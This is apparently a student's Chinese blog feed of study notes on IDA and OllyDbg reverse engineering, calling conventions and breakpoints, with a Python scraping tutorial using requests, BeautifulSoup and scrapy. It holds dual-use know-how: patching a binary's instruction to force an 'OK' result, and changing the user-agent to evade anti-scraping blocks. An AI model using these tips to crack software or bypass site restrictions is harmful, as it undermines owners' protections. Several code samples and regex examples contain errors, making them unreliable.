在一系列编译器的标准库文件里自动找出调用的函数，如，把’call 406E40’识别为’call strlen’<br>
如果没有自动识别出来，可以强制使用编译器特征文件（xxxx.sig）<br>
‘View’-&gt;‘Open subviews’-&gt;'Signatures’或’Shift+F5’打开签名窗口，右键’Apply new signature’选择签名文件</p>
<h2 id="（不知道把这部分叫作啥）">（不知道把这部分叫作啥）</h2>
<ol>
<li></li>
</ol>
<p><img src="https://s1.ax1x.com/2020/03/12/8eOmin.md.png" alt="可见，可以把004010c9的内容改了让程序显示'OK'"></p>
<p><img src="https://s1.ax1x.com/2020/03/14/8lFm6K.png" alt="Assmeble修改汇编指令，Apply patches to input file...将修改保存到文件"><br>
2.<br>
输入输出等函数可在name窗口中查看</p>
<h1>32位软件逆向技术</h1>
<h2 id="启动函数">启动函数</h2>
<p>Windows程序执行并不是由WinMain函数开始的，首先执行的是启动函数的相关代码（由编译器生成），完成后才调用WinMain函数</p>
<p>c/c++程序的启动函数作用基本相同，包括 检索指向新进程的<u>命令行</u>指针、检索指向新进程的<u>环境变量</u>指针、全局变量初始化和内存栈初始化等</p>
<p><img src="https://s1.ax1x.com/2020/03/12/8maVFP.md.png" alt="某程序启动代码（部分）"><br>
分析程序的过程中可以略过启动代码，直接将重点放到WinMain函数上</p>
<h2 id="函数">函数</h2>
<p>通过call…ret把函数调用和其他跳转指令区别开<br>
直接调用：call <u>函数首地址</u><br>
间接调用：call [<u> eax </u>] (通过寄存器传递函数地址或动态计算函数地址)</p>
<h3 id="函数的参数">函数的参数</h3>
<p>函数传递参数有3种方式：栈方式、寄存器方式、通过全局变量进行隐含参数传递方式<br>
每一种机制与使用的编译语言有关</p>
<h4 id="利用栈传递参数">利用栈传递参数</h4>
<p>函数计算结束后，由调用者或函数本身修改栈，使栈恢复原样（<strong>平衡栈数据</strong>）<br>
调用约定：为了实现函数调用而建立的协议（按照什么顺序入栈；由谁来平衡栈…）</p>
<ol>
<li>c规范(__cdecl)函数按照从右到左的顺序入栈，由调用者负责清除栈（c/c++/mfc(微软基础类库)默认调用约定）</li>
<li>stdcall调用约定按照从右到左传递参数，并由调用的函数在返回前清理传送参数的内存栈</li>
<li>stdcall调用约定是Win32 API采用的约定方式，在Win32 API种也有一些函数采用(__cdecl)调用，如wsprintf</li>
</ol>
<p>c、c++、pascal 等高级语言的子程序执行过程基本相似：</p>
<ol>
<li>调用者将函数执行完毕时应返回的地址和参数压入栈</li>
<li>子程序通过’ebp 指针+偏移量’对栈中的操作进行寻址</li>
<li>子程序使用ret或retf返回，此时cpu将eip置为栈中保存的地址</li>
</ol>
<p>栈的操作对象只能是双操作数（占4个字节）<br>
<img src="https://s1.ax1x.com/2020/03/14/8lP1De.md.png" alt="一个凑行数的图"></p>
<p>用ebp存取栈<br>
用ret平衡栈时，在ret指令后加一个操作数，表示在ret指令后给esp加上操作数  如’ret 8’相当于在返回后将esp+8，ret后面的值等于参数个数*4h</p>
<p>enter 和 leave指令可以帮助进行栈的维护</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enter xxxx,0   ;0表示创建xxxx大小的空间来放置局部变量</span><br><span class="line">....</span><br><span class="line">leave </span><br><span class="line">ret 8</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">enter的作用为：</span><br><span class="line">push ebp</span><br><span class="line">mov ebp,esp</span><br><span class="line">sub esp,xxxx</span><br><span class="line"></span><br><span class="line">leave的作用为：</span><br><span class="line">add esp,xxxx</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<blockquote>
<p>ENTER 有两个操作数：第一个是常数，定义为局部变量保存的堆栈空间字节数；第二个定义了过程的词法嵌套级。<br>
ENTER numbytes, nestinglevel<br>
Numbytes 总是向上舍入为 4 的倍数，以便 ESP 对齐双字边界。Nestinglevel 确定了从主调过程堆栈帧复制到当前帧的堆栈帧指针的个数。</p>
</blockquote>
<h4 id="利用寄存器传递参数">利用寄存器传递参数</h4>
<p>绝大多数编译器都遵循fastcall规范<br>
不同的编译器实现的fastcall稍有不同</p>
<h4 id="名称修饰约定">名称修饰约定</h4>
<p>c++编译器会按照某种规则改写每一个入口点的符号名，从而允许同一个名字有多个用法且不破坏链接器。这种技术称为名称改编或名称修饰<br>
在vc++种，函数修饰名由编译类型(c/c++)、函数名、类（class）名、调用约定、返回类型等决定<br>
<img src="https://s1.ax1x.com/2020/03/15/83ZkQA.png" alt="常见的c和c++编译函数名的修饰"></p>
<h3 id="函数的返回值">函数的返回值</h3>
<p>最常见的是return操作符，还有通过参数 按 传引用方式 返回值、通过全局变量返回值</p>
<h4 id="用return操作符返回值">用return操作符返回值</h4>
<p>一般情况下返回值放在eax中，如果超过大小，高32位就会放在edx<br>
对于一个返回两个参数和的子函数：<br>
<img src="https://s1.ax1x.com/2020/03/15/83eB4S.png" alt="圈起来的即为存放返回值的过程"><br>
对应c语言代码：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">add(<span class="keyword">int</span> x,<span class="keyword">int</span> y)&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    temp=x+y;</span><br><span class="line">    <span class="keyword">return</span> temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="通过参数按传引用方式返回值">通过参数按传引用方式返回值</h3>
<p>传递参数的方式有：传值和传引用<br>
传值调用时会建立参数的一份复本，并把它传给调用参数<br>
传引用允许调用函数修改原始变量的值（指针）</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">max</span><span class="params">(<span class="keyword">int</span> *a,<span class="keyword">int</span> *b)</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(*a&lt;*b)</span><br><span class="line">        *a=*b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/15/83uRHI.png" alt=" "></p>
]]></content>
      <tags>
        <tag>周报</tag>
        <tag>加密与解密</tag>
      </tags>
  </entry>
  <entry>
    <title>python 爬虫学习</title>
    <url>/710f8e5f.html</url>
    <content><![CDATA[<p>就此开一篇单独记录 py 爬虫的学习<u>以及实操中遇到的问题</u>(可能吧)<br>
（分割线用（***或—））</p>
<h2 id="more"><span id="more"></span></h2>
<h1>爬虫入门</h1>
<p>以下为 mooc 上 BIT 嵩天老师课程<span class="exturl" data-url="aHR0cHM6Ly93d3cuaWNvdXJzZTE2My5vcmcvbGVhcm4vQklULTEwMDE4NzAwMDE/dGlkPTEyMDY5NTEyNjgjL2xlYXJuL2Fubm91bmNl">Python 网络爬虫与信息提取<i class="fa fa-external-link-alt"></i></span>的学习</p>
<h2 id="requests-库">requests 库</h2>
<h3 id="安装">安装</h3>
<p>管理员打开 cmd，安装 requests 库</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install requests </span><br></pre></td></tr></table></figure>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyB5j.md.png" alt="以此检测安装成功"></p>
<h4 id="tip：-pip-下载超时（timeout）">tip： pip 下载超时（timeout）</h4>
<p>cmd 输入指令：</p>
<ol>
<li>pip --default-timeout=100 install -U pip</li>
</ol>
<p>或</p>
<ol start="2">
<li>pip install pip -U</li>
</ol>
<p>pip config set global.index-url <span class="exturl" data-url="aHR0cHM6Ly9weXBpLnR1bmEudHNpbmdodWEuZWR1LmNuL3NpbXBsZQ==">https://pypi.tuna.tsinghua.edu.cn/simple<i class="fa fa-external-link-alt"></i></span><br>
（升级 pip 后更换为的清华镜像）</p>
<h3 id="r-request-get-url">r=request.get(url)</h3>
<p>构造一个向服务器请求资源的 request 对象，返回一个包含服务器资源的 response 对象<br>
response 对象包含了服务器返回的所有信息</p>
<p><img src="https://s1.ax1x.com/2020/03/17/8tysGn.md.png" alt="8tysGn.md.png"></p>
<p>r.apparent_encoding: 根据网页内容分析出的编码方式<br>
r.encoding: 如果 header 中不存在 charset，则默认编码为 ISO-8859-1</p>
<h3 id="爬取网页的通用代码框架">爬取网页的通用代码框架</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8tyy2q.md.png" alt="8tyy2q.md.png"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requsets</span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getHTMLText</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()    <span class="comment"># 判断状态  如果不是200，则引发HTTPError异常</span></span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;产生异常&quot;</span></span><br><span class="line"><span class="comment">#----</span></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    url=<span class="string">&quot;http://www.baidu.com&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;getHTMLText(url))</span></span><br></pre></td></tr></table></figure>
<p>try：python 捕捉异常语句，详见：<span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9weXRob24vcHl0aG9uLWV4Y2VwdGlvbnMuaHRtbA==">https://www.runoob.com/python/python-exceptions.html<i class="fa fa-external-link-alt"></i></span></p>
<h3 id="requests-库主要方法">requests 库主要方法</h3>
<p><img src="https://s1.ax1x.com/2020/03/17/8ty6x0.md.png" alt="8ty6x0.md.png"></p>
<p>requests.request(method, url, **kwargs)<br>
requests.get(url, params=None, **kwargs)<br>
requests.head(url, **kwargs)<br>
requests.post(url, data=None, json=None, **kwargs)<br>
requests.put(url, data=None, **kwargs)<br>
requests.patch(url, data=None, **kwargs)<br>
requests.delete(url, **kwargs)</p>
<h4 id="kwargs">**kwargs:</h4>
<ol>
<li>params：字典或字节序列，作为参数添加到 url 中</li>
<li>data：字典、字节序列或文件对象，作为 request 的内容</li>
<li>json：json 格式的数据，作为 request 的内容</li>
<li>headers：定制 header</li>
<li>cookies</li>
<li>auth</li>
<li>files：传输文件</li>
<li>timeout：设定超时时间，单位为秒</li>
<li>proxies：设置代理服务器</li>
<li>allow_redirects</li>
<li>stream</li>
<li>verify</li>
<li>cert</li>
</ol>
<h3 id="爬虫尺寸">爬虫尺寸</h3>
<p>小规模：爬取网页。数据量小，速度不敏感。使用 requests 库<br>
中规模：爬取网站。数据量大，速度敏感。使用 scrapy 库<br>
大规模：爬取全网。（搜索引擎）</p>
<h3 id="限制爬虫">限制爬虫</h3>
<ol>
<li>来源审查：判断 user-agent</li>
<li>robots 协议</li>
</ol>
<h3 id="robots-协议">robots 协议</h3>
<p>Robots Exclusion Standard<br>
网络爬虫先识别 robots.txt 再进行爬取<br>
robots 协议时建议而非约束性，不遵守的话存在法律风险（类人行为可不参考 robots 协议）</p>
<h3 id="拒绝被爬：尝试修改-user-agent">拒绝被爬：尝试修改 user-agent</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8y3yQ0.md.png" alt="主要为黄色荧光部分"></p>
<h3 id="搜索引擎关键词提交">搜索引擎关键词提交</h3>
<p>百度：<span class="exturl" data-url="aHR0cHM6Ly93d3cuYmFpZHUuY29tL3M/d2Q9">https://www.baidu.com/s?wd=<i class="fa fa-external-link-alt"></i></span><u>关键词</u></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">keyword=<span class="string">&quot;xxxx&quot;</span></span><br><span class="line"></span><br><span class="line">kv=&#123;<span class="string">&#x27;wd&#x27;</span>:keyword&#125;</span><br><span class="line"></span><br><span class="line">r=requests.get(<span class="string">&quot;https://www.baidu.com/s&quot;</span>,params=kv)</span><br></pre></td></tr></table></figure>
<h3 id="图片的爬取和存储">图片的爬取和存储</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">url=<span class="string">&quot;....../...jpg&quot;</span></span><br><span class="line">root=<span class="string">&quot;D://pics//&quot;</span></span><br><span class="line">path=root+url.split(<span class="string">&#x27;/&#x27;</span>)[-<span class="number">1</span>]    <span class="comment">#需要import os</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(root):</span><br><span class="line">        os.mkdir(root)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(path):</span><br><span class="line">        r=requests.get(url)</span><br><span class="line">        <span class="comment">#保存↓</span></span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(path,<span class="string">&#x27;wb&#x27;</span>)<span class="keyword">as</span> f:</span><br><span class="line">            f.write(r.content)</span><br><span class="line">            f.close()</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;成功“)</span></span><br><span class="line"><span class="string">    else:</span></span><br><span class="line"><span class="string">        print(&quot;</span>文件已存在<span class="string">&quot;)</span></span><br><span class="line"><span class="string">except:</span></span><br><span class="line"><span class="string">    print(&quot;</span>失败<span class="string">&quot;)</span></span><br></pre></td></tr></table></figure>
<h2 id="BeautifulSoup-库">BeautifulSoup 库</h2>
<p>BeautifulSoup 库是一个解析、遍历、维护标签树的功能库</p>
<h3 id="安装-2">安装</h3>
<p>cmd 下</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install beautifulsoup4</span><br></pre></td></tr></table></figure>
<p>使用：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">或</span><br><span class="line"><span class="keyword">import</span> bs4</span><br></pre></td></tr></table></figure>
<p>作用：html 文档 ↔ 标签树 ↔beautifulsoup 类</p>
<h3 id="BeautifulSoup-基本元素">BeautifulSoup 基本元素</h3>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjZ5R.md.png" alt="8yjZ5R.md.png"></p>
<p><img src="https://s1.ax1x.com/2020/03/19/8yjEVJ.md.png" alt="8yjEVJ.md.png"></p>
<p>例：<br>
打印标签</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line">r=requests.get(<span class="string">&quot;https://python123.io/ws/demo.html&quot;</span>)</span><br><span class="line">demo=r.text</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)  <span class="comment">#parser:html解析器</span></span><br><span class="line">soup.title  <span class="comment">#打印title标签</span></span><br><span class="line">soup.a.attrs[<span class="string">&quot;href&quot;</span>]   <span class="comment">#打印标签的链接</span></span><br></pre></td></tr></table></figure>
<h3 id="html-内容遍历">html 内容遍历</h3>
<p>html–树形结构<br>
遍历：下行遍历、上行遍历、平行遍历</p>
<h4 id="下行遍历：">下行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFk0H.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span>(child) <span class="keyword">in</span> soup.body.children:</span><br><span class="line">    <span class="built_in">print</span>(child)</span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">获得子节点的数量：</span><br><span class="line"><span class="built_in">len</span>(soup.body.contents)</span><br><span class="line"></span><br><span class="line">获得其中某个的内容：</span><br><span class="line">soup.body.contents[<span class="number">1</span>]   <span class="comment">#获得第二个</span></span><br></pre></td></tr></table></figure>
<p>ps:'儿子节点’这种叫法听起来真是贼奇怪</p>
<h4 id="上行遍历：">上行遍历：</h4>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFPXD.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看父标签:</span><br><span class="line">soup.title.parent</span><br><span class="line">最高级标签（&lt;html&gt;他爸是他自己（.....)</span><br><span class="line"></span><br><span class="line">完整遍历：</span><br><span class="line">soup=BeautifulSoup(demo,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> parent <span class="keyword">in</span> soup.a.parents:</span><br><span class="line">    <span class="keyword">if</span> parent <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(parent)</span><br></pre></td></tr></table></figure>
<h4 id="平行遍历：">平行遍历：</h4>
<p>发生在同一个父节点下的各个节点间<br>
平行遍历获得的下一个结点不一定是标签类型</p>
<p><img src="https://s1.ax1x.com/2020/03/21/8fFFne.png" alt=" "></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">查看下一个平行标签:</span><br><span class="line">soup.a.next_sibling</span><br><span class="line">查看前一个平行标签:</span><br><span class="line">soup.a.previous_sibling</span><br><span class="line"></span><br><span class="line">完整：</span><br><span class="line"><span class="keyword">for</span> sibling <span class="keyword">in</span> soup.a.<span class="built_in">next</span>（或前序结点previous）_siblings:</span><br><span class="line">    <span class="built_in">print</span>(sibling)</span><br></pre></td></tr></table></figure>
<h3 id="Prettify">Prettify</h3>
<p>作用：在每个标签后添加换行符，print 的时候易于阅读<br>
使用方法：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="built_in">print</span>(soup.prettify())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(soup.a.prettify())    <span class="comment">#单独对某个标签进行处理</span></span><br></pre></td></tr></table></figure>
<p> </p>
<p>以上为 2020.3.16-2020.3.21</p>
<hr>
<h2 id="正则表达式">正则表达式</h2>
<p>regular expression (RE)</p>
<table>
<thead>
<tr>
<th>操作符</th>
<th>说明</th>
<th>实例</th>
</tr>
</thead>
<tbody>
<tr>
<td>.</td>
<td>任何单个字符</td>
<td></td>
</tr>
<tr>
<td>[ ]</td>
<td>字符集</td>
<td>[abc]:a、b、c; [a-z]:a~z 单个字符</td>
</tr>
<tr>
<td>[^ ]</td>
<td>非字符集</td>
<td>[^abc]: 非 a、b、c 的单个字符</td>
</tr>
<tr>
<td>*</td>
<td>前一个字符 0 次或无限次扩展</td>
<td>abc *：ab、abc、abcc… …</td>
</tr>
<tr>
<td>+</td>
<td>前一个字符 1 次或无限次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>?</td>
<td>前一个字符 0 次或 1 次扩展</td>
<td>abc *：abc、abcc… …</td>
</tr>
<tr>
<td>\</td>
<td></td>
<td>左右表达式任意一个： abc\ def :abc 或 def</td>
</tr>
<tr>
<td>{num}</td>
<td>扩展前一个字符 m 次</td>
<td>ab{2}c：abbc</td>
</tr>
<tr>
<td>^</td>
<td>匹配字符串开头</td>
<td>^abc:abc 在字符串的开头</td>
</tr>
<tr>
<td>$</td>
<td>匹配字符串结尾</td>
<td>$abc:abc 在字符串的结尾</td>
</tr>
<tr>
<td>( )</td>
<td>分组标记，内部使用\</td>
<td>操作符 (abc):abc; (abc</td>
</tr>
<tr>
<td>\d</td>
<td>等价于 0~9</td>
<td></td>
</tr>
<tr>
<td>\w</td>
<td>等价于 A ~ Z, a ~ z, 0 ~ 9, _</td>
<td></td>
</tr>
</tbody>
</table>
<p><span class="exturl" data-url="aHR0cHM6Ly93d3cucnVub29iLmNvbS9yZWdleHAvcmVnZXhwLXR1dG9yaWFsLmh0bWw=">https://www.runoob.com/regexp/regexp-tutorial.html<i class="fa fa-external-link-alt"></i></span></p>
<h2 id="Re-库">Re 库</h2>
<h3 id="调用方法">调用方法</h3>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> re</span><br></pre></td></tr></table></figure>
<h3 id="表达式的表达类型">表达式的表达类型</h3>
<p>raw string：不包含转义符(\)的字符串<br>
string 类型(将’‘理解为转义符)<br>
raw string 如：r’[1-9]\d{5}‘、r’\d{3}-\d{8}\d{4}-\d{7}’<br>
string 如：[1-9]\\d{5}‘\\d{3}-\\d{8}\\d{4}-\\d{7}’</p>
<h3 id="主要功能函数">主要功能函数</h3>
<p><img src="https://s1.ax1x.com/2020/03/26/GSHMGD.png" alt=" "></p>
<ol>
<li>re.search(pattern,string,flags=0)</li>
<li>re.match(pattern,string,flags=0)</li>
<li>re.findall(pattern,string,flags=0)</li>
<li>re.finditer(pattern,stirng,flags=0)</li>
</ol>
<p>pattern: 正则表达式的字符串或原生字符串表示<br>
string：待匹配字符串</p>
<p>flags：正则表达式使用时的一些控制标记，包括：<br>
re. I:ignorecase, 忽略大小写<br>
re. M:multiline, 使用’^‘时将每行都当作匹配开始<br>
re. S:dotall, 让’.'匹配所有字符，包括换行符</p>
<ol start="5">
<li>re.search(pattern,string,maxsplit=0,flags=0)</li>
</ol>
<p>maxsplit: 最大分割数，限制分割的数量为 n，将剩下的所有部分输出为第 n+1 个</p>
<ol start="6">
<li>re.sub(pattern,repl,string,count=0,flags=0)</li>
</ol>
<p>repl: 替换的字符串<br>
count：替换的最大次数<br>
 </p>
<p>以上为2020.03.22-2020.03.28</p>
<hr>
<h3 id="RE库的match对象">RE库的match对象</h3>
<p>用 type(match)检查 match 的类型</p>
<p><img src="https://s1.ax1x.com/2020/04/02/GGx6qs.png" alt=" "><br>
<img src="https://s1.ax1x.com/2020/04/02/GGxyrj.png" alt=" "></p>
<h3 id="贪婪匹配和最小匹配">贪婪匹配和最小匹配</h3>
<p>re库默认采用贪婪匹配，即输出匹配最长的子串</p>
<h2 id="Scrapy库">Scrapy库</h2>
<h3 id="scrapy爬虫框架安装">scrapy爬虫框架安装</h3>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip install scrapy</span><br><span class="line">scrapy -h    # 测试安装成功</span><br></pre></td></tr></table></figure>
<h3 id="scrapy-爬虫框架结构">scrapy 爬虫框架结构</h3>
<p>5个主体+2个中间件<br>
3个主体（engine+downloader+scheduler）为已有实现<br>
2个主体（item pipelines+spiders）为用户配置：<br>
item pipelines对获得信息进行处理<br>
spiders提供url和解析网页的内容</p>
<p>**以下3个不需要用户配置<br>
engine控制所有模块之间的数据流，根据条件触发事件<br>
downloader根据请求下载<br>
scheduler对所有爬取进行调度<br>
在以上三个中有一个中间件：downloader middleware</p>
<h3 id="scrapy库爬虫常用命令">scrapy库爬虫常用命令</h3>
<p>格式：scrapy<command>[options][args]<br>
一个工程是最大的单元（大的scrapy框架），其中有多个spider<br>
<img src="https://s1.ax1x.com/2020/04/05/GBh3Pf.png" alt=" "></p>
<h3 id="实例">实例</h3>
<p>…</p>
<h2 id="实例-2">实例</h2>
<h3 id="中国大学排名爬取">中国大学排名爬取</h3>
<p>数据来源：<span class="exturl" data-url="aHR0cDovL3d3dy56dWloYW9kYXh1ZS5jb20venVpaGFvZGF4dWVwYWltaW5nMjAxOS5odG1s">软科中国最好大学排名2019<i class="fa fa-external-link-alt"></i></span></p>
<ol>
<li>获取网页内容：gethtmltext()</li>
<li>提取信息到合适的数据结构：fillunivlist()</li>
<li>输出结果：printunivlist()</li>
</ol>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> bs4 <span class="keyword">import</span> BeautifulSoup</span><br><span class="line"><span class="keyword">import</span> bs4</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gethtmltext</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.get(url,timeout=<span class="number">30</span>)</span><br><span class="line">        r.raise_for_status()</span><br><span class="line">        r.encoding=r.apparent_encoding</span><br><span class="line">        <span class="keyword">return</span> r.text</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot; &quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillunivlist</span>(<span class="params">ulist,html</span>):</span></span><br><span class="line">    soup=BeautifulSoup(html,<span class="string">&quot;html.parser&quot;</span>)</span><br><span class="line">    <span class="keyword">for</span> tr <span class="keyword">in</span> soup.find(<span class="string">&#x27;tbody&#x27;</span>).children:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(tr,bs4.element.Tag):</span><br><span class="line">            tds=tr(<span class="string">&#x27;td&#x27;</span>)</span><br><span class="line">            ulist.append([tds[<span class="number">0</span>].string,tds[<span class="number">1</span>].string,tds[<span class="number">3</span>].string])</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">printunivlist</span>(<span class="params">ulist,num</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;排名&quot;</span>,<span class="string">&quot;学校名称&quot;</span>,<span class="string">&quot;总分&quot;</span>))</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(num):</span><br><span class="line">        u=ulist[i]</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;&#123;:^10&#125;\t&#123;:^6&#125;\t&#123;:^10&#125;&quot;</span>.<span class="built_in">format</span>(u[<span class="number">0</span>],u[<span class="number">1</span>],u[<span class="number">2</span>]))</span><br><span class="line">        </span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;suc&quot;</span>+<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    uinfo=[]<span class="comment"># 存放大学信息</span></span><br><span class="line">    url=<span class="string">&quot;http://www.zuihaodaxue.com/zuihaodaxuepaiming2019.html&quot;</span></span><br><span class="line">    html=gethtmltext(url)</span><br><span class="line">    fillunivlist(uinfo,html)</span><br><span class="line">    printunivlist(uinfo,<span class="number">20</span>)</span><br><span class="line"></span><br><span class="line">main()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title>2020.02.24-2020.03.01</title>
    <url>/9fec375a.html</url>
    <content><![CDATA[<h1>OllyDbg 学习</h1>
<h2 id="常用断点">常用断点</h2>
<h3 id="int-interrupt-3断点">int(interrupt) 3断点</h3>
<p>在OD中用’F2’来设置，机器码是0xCC<br>
执行一个int 3断点时，该地址处的指令首字节修改位CC（OD显示的还是原来的指令）</p>
<p>优点是可以设置无数个指令，缺点是<strong>改变了原程序机器码，容易被软件检测到</strong>，例如有些软件会检测api的首地址是否为0xCC</p>
<h3 id="硬件断点">硬件断点</h3>
<p>和DRx调试寄存器有关<br>
DRx调试器共有8个（x从0 ~ 7）</p>
<p><img src="https://s2.ax1x.com/2020/02/24/3G1qVf.png" alt=" "></p>
<span id="more"></span>
<p>0 ~ 3：调试地址寄存器，用于保存需要监视的地址，例如设置硬件断点<br>
4、5：（先不做了解）<br>
6：调试寄存器组状态寄存器（‘这个寄存器主要是在调试异常产生后，报告产生调试异常的相关信息’)<br>
7：调试寄存器组控制寄存器，控制调试<br>
硬件断点的原理是使用DR0、DR1、DR2、DR3设定地址，并用DR7设定状态，因此最多设置4个断点<br>
设置方法为：1.在代码行单击右键，执行’断点’-&gt;‘硬件执行 2.在数据窗口’右键’-&gt;‘硬件访问断点’-&gt;（选择数据长度1/2/4字节），如4字节（Dword)当访问xxxxx0~xxxxx3的内存时会被断下</p>
<p>快捷键’F4’执行到光标所在的行</p>
<h3 id="内存断点">内存断点</h3>
<p>原理是对所设的地址赋予不可访问/不可写属性，当访问/写入的时候就会产生异常，OD比较异常地址是不是断点地址，如果是就中断<br>
设置内存断点在每次出现异常时都需要比较来判断是否应该中断，所以会降低OD的执行速度<br>
OD只能下一个内存断点，设置方法为：在数据/代码窗口选中要下断点的地址区域，右键执行’断点’-&gt;‘内存写入’<br>
硬件访问/写入断点实在触发硬件断点的下一条指令处下断；内存断点是在触发断点的指令处下断。<br>
内存断点不修改原始代码，不会因为被程序校验而失败</p>
<h3 id="内存访问一次性断点">内存访问一次性断点</h3>
<p>windows 对内存使用段页式的管理方式</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">(quote):</span><br><span class="line">段页式存储管理方式即先将用户程序分成若干个段，再把每个段分成若干个页，并为每一个段赋予一个段名。</span><br><span class="line">（基本分段存储管理方式和基本分页存储管理方式原理的结合）</span><br></pre></td></tr></table></figure>
<p>快捷键’Alt+M’显示内存，可以看到许多段，每个段都有不可访问、读、写、执行属性<br>
可用’F2’对整个段设置断点。当所在段被读取或执行时，中断发生，断点删除。</p>
<h3 id="消息断点">消息断点</h3>
<p>当某个特定窗口函数接收到某个特定消息时，消息断点将使程序中断<br>
消息断点与INT 3断点的区别在于：INT 3 断点可以在程序启动之前设置，消息断点<strong>只有在窗口被创建后才能设置</strong></p>
<p>当用户点击按钮、移动光标、输入文字时，一条消息就会发送给当前窗体。发送的信息有4个参数：1个窗口句柄，1个消息编号，2个32位长的参数。<br>
设置方法：工具栏中的’w’按钮，在条目上单击右键…。</p>
<p>ps：<em>当单击按钮并松开时会发送’WM_LBUTTONUP’这个消息。</em></p>
<h3 id="条件断点">条件断点</h3>
<p>在满足一定条件时才会中断。OD中可以按寄存器、储存器、消息等设断点。<br>
用带有条件表达式的INT 3 断点，当调试器遇到断点时，计算表达式的值，如果表达式有效则断点生效。</p>
<ol>
<li>按寄存器条件中断<br>
快捷键’Shift+F2’ 条件表达式例如：  eax==0400000</li>
<li>按存储器条件中断<br>
<em>（CreateFileA函数用于打开文件，可对其设断）</em><br>
